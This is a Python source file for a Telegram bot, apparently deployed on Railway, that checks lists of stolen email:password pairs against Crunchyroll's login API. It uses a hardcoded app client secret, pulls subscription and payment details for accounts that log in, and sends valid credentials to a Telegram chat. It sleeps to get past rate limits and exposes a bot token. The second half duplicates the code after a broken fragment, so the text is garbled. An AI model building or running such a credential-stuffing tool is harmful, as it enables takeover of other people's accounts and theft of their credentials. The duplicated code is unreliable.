import os
import requests
import time
import asyncio
from uuid import uuid1
from fastapi import FastAPI, Request
from pydantic import BaseModel
import uvicorn

app = FastAPI(title="Crunchyroll Checker Bot")

# Environment variables from Railway
BOT_TOKEN = os.getenv("8677251975:AAGuEGmCIvQLUKO4j4dM7wGYMAExldG7ftM")
CHAT_ID = os.getenv("@cr_chker_bot")
COMBO_FILE = os.getenv("COMBO_FILE", "combos.txt")

if not BOT_TOKEN or not CHAT_ID:
    print("ERROR: BOT_TOKEN and CHAT_ID must be set in Railway Variables!")
    # Don't exit here - let FastAPI start so you can see logs

# Telegram send message helper
def send_telegram(text: str):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
        requests.post(url, json=payload, timeout=10)
    except:
        pass

G = '\033[2;32m'
R = '\033[1;31m'
O = '\x1b[38;5;208m'

def check_account(email: str, pasw: str):
    try:
        headers = {
            "ETP-Anonymous-ID": str(uuid1()),
            "Request-Type": "SignIn",
            "Accept": "application/json",
            "User-Agent": "Ktor client",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Host": "beta-api.crunchyroll.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        }

        data = {
            "grant_type": "password",
            "username": email,
            "password": pasw,
            "scope": "offline_access",
            "client_id": "yhukoj8on9w2pcpgjkn_",
            "client_secret": "q7gbr7aXk6HwW5sWfsKvdFwj7B1oK1wF",
            "device_type": "FIRETV",
            "device_id": str(uuid1()),
            "device_name": "kara"
        }

        res = requests.post(
            "https://beta-api.crunchyroll.com/auth/v1/token",
            data=data, headers=headers, timeout=15
        )

        if "refresh_token" not in res.text:
            if "406 Not Acceptable" in res.text:
                send_telegram("⚠️ Rate limit hit — waiting 7 minutes...")
                time.sleep(420)
                return "RATE_LIMIT"
            else:
                send_telegram(f"{R}{email} ⥤ [BAD]")
                return "BAD"

        token = res.text.split('access_token":"')[1].split('"')[0]

        headers_get = {
            "Authorization": f"Bearer {token}",
            "Accept": "application/json",
            "User-Agent": "Ktor client",
            "Host": "beta-api.crunchyroll.com"
        }

        res_get = requests.get(
            "https://beta-api.crunchyroll.com/accounts/v1/me",
            headers=headers_get, timeout=10
        )

        if "external_id" not in res_get.text:
            send_telegram(f"{R}{email} ⥤ [BAD]")
            return "BAD"

        external_id = res_get.text.split('external_id":"')[1].split('"')[0]

        res_info = requests.get(
            f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/third_party_products",
            headers=headers_get, timeout=10
        )

        text_lower = res_info.text.lower()
        if any(x in text_lower for x in ["fan", "premium", "no_ads", 'is_subscribable":false']):
            try:
                plan_type = res_info.text.split('"type":"')[1].split('"')[0]
                free_trial = res_info.text.split('"active_free_trial":')[1].split(",")[0]
                payment = res_info.text.split('"source":"')[1].split('"')[0]
                expiry = res_info.text.split('"expiration_date":"')[1].split('T')[0]

                msg = f"""
┏━━━━━━━⍟
┃{email}
┗━━━━━━━━━━━⊛
┏━━━━⍟
┃{pasw}
┗━━━━━━━━━━━⊛
┏━━━━━━━⍟
┃Plan ⥤ {plan_type}
┃Free Trial ⥤ {free_trial}
┃Payment ⥤ {payment}
┃Expiry ⥤ {expiry}
┗━━━━━━━━━━━⊛
# Crunchyroll Checker Bot
"""
                send_telegram(msg)
                return "HIT"
            except:
                send_telegram(f"{G}{email} ⥤ [HIT]")
                return "HIT"
        else:
            send_telegram(f"{O}{email} ⥤ [CUSTOM]")
            return "CUSTOM"

    except Exception as e:
        send_telegram(f"Error on {email}: {str(e)[:150]}")
        return "ERROR"


class TelegramUpdate(BaseModel):
    update_id: int
    message: dict | None = None


@app.post("/webhook")
async def telegram_webhook(update: Request):
    try:
        data = await update.json()
        message = data.get("message")
        if not message:
            return {"ok": True}

        chat_id = str(message.get("chat", {}).get("id"))
        text = message.get("text", "")

        # Security: Only allow your chat ID
        if chat_id != CHAT_ID:
            return {"ok": True}

        if text == "/start":
            await asyncio.to_thread(send_telegram, "✅ Crunchyroll Checker Bot is Online!\n\nUse /check to start checking combos.")

        elif text == "/check":
            await asyncio.to_thread(send_telegram, "Starting combo check... This may take a while.")

            try:
                with open(COMBO_FILE, "r", encoding="utf-8", errors="ignore") as f:
                    lines = f.read().splitlines()

                total = len(lines)
                await asyncio.to_thread(send_telegram, f"Loaded {total} accounts. Checking...")

                for i, line in enumerate(lines, 1):
                    if not line.strip() or ":" not in line:
                        continue
                    try:
                        email, pasw = line.strip().split(":", 1)
                        check_account(email.strip(), pasw.strip())
                        if i % 8 == 0:   # Progress update
                            await asyncio.to_thread(send_telegram, f"Progress: {i}/{total}")
                        time.sleep(1.5)   # Be gentle with rate limits
                    except:
                        continue

                await asyncio.to_thread(send_telegram, "✅ Checking completed!")

            except FileNotFoundError:
                await asyncio.to_thread(send_telegram, f"Combo file '{COMBO_FILE}' not found!")

    except Exception as e:
        print(f"Webhook error: {e}")

    return {"ok": True}


@app.get("/")
async def root():
    return {"status": "Crunchyroll Checker Bot is running on Railway (Webhook mode)"}


if __name__ == "__main__":
    uvicorn.run("main:app", host="0.0.0.0", port=int(os.getenv("PORT", 8000)))        )

        if "external_id" not in res_get.text:
            send_telegram(f"{R}{email} ⥤ [BAD]")
            return "BAD"

        external_id = res_get.text.split('external_id":"')[1].split('"')[0]

        res_info = requests.get(
            f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/third_party_products",
            headers=headers_get, timeout=10
        )

        text_lower = res_info.text.lower()
        if any(x in text_lower for x in ["fan", "premium", "no_ads", 'is_subscribable":false']):
            try:
                plan_type = res_info.text.split('"type":"')[1].split('"')[0]
                free_trial = res_info.text.split('"active_free_trial":')[1].split(",")[0]
                payment = res_info.text.split('"source":"')[1].split('"')[0]
                expiry = res_info.text.split('"expiration_date":"')[1].split('T')[0]

                msg = f"""
┏━━━━━━━⍟
┃{email}
┗━━━━━━━━━━━⊛
┏━━━━⍟
┃{pasw}
┗━━━━━━━━━━━⊛
┏━━━━━━━⍟
┃Plan ⥤ {plan_type}
┃Free Trial ⥤ {free_trial}
┃Payment ⥤ {payment}
┃Expiry ⥤ {expiry}
┗━━━━━━━━━━━⊛
# Crunchyroll Checker Bot
"""
                send_telegram(msg)
                return "HIT"
            except:
                send_telegram(f"{G}{email} ⥤ [HIT]")
                return "HIT"
        else:
            send_telegram(f"{O}{email} ⥤ [CUSTOM]")
            return "CUSTOM"

    except Exception as e:
        send_telegram(f"Error on {email}: {str(e)[:150]}")
        return "ERROR"


class TelegramUpdate(BaseModel):
    update_id: int
    message: dict | None = None


@app.post("/webhook")
async def telegram_webhook(update: Request):
    try:
        data = await update.json()
        message = data.get("message")
        if not message:
            return {"ok": True}

        chat_id = str(message.get("chat", {}).get("id"))
        text = message.get("text", "")

        # Security: Only allow your chat ID
        if chat_id != CHAT_ID:
            return {"ok": True}

        if text == "/start":
            await asyncio.to_thread(send_telegram, "✅ Crunchyroll Checker Bot is Online!\n\nUse /check to start checking combos.")

        elif text == "/check":
            await asyncio.to_thread(send_telegram, "Starting combo check... This may take a while.")

            try:
                with open(COMBO_FILE, "r", encoding="utf-8", errors="ignore") as f:
                    lines = f.read().splitlines()

                total = len(lines)
                await asyncio.to_thread(send_telegram, f"Loaded {total} accounts. Checking...")

                for i, line in enumerate(lines, 1):
                    if not line.strip() or ":" not in line:
                        continue
                    try:
                        email, pasw = line.strip().split(":", 1)
                        check_account(email.strip(), pasw.strip())
                        if i % 8 == 0:   # Progress update
                            await asyncio.to_thread(send_telegram, f"Progress: {i}/{total}")
                        time.sleep(1.5)   # Be gentle with rate limits
                    except:
                        continue

                await asyncio.to_thread(send_telegram, "✅ Checking completed!")

            except FileNotFoundError:
                await asyncio.to_thread(send_telegram, f"Combo file '{COMBO_FILE}' not found!")

    except Exception as e:
        print(f"Webhook error: {e}")

    return {"ok": True}


@app.get("/")
async def root():
    return {"status": "Crunchyroll Checker Bot is running on Railway (Webhook mode)"}


if __name__ == "__main__":
    uvicorn.run("main:app", host="0.0.0.0", port=int(os.getenv("PORT", 8000)))
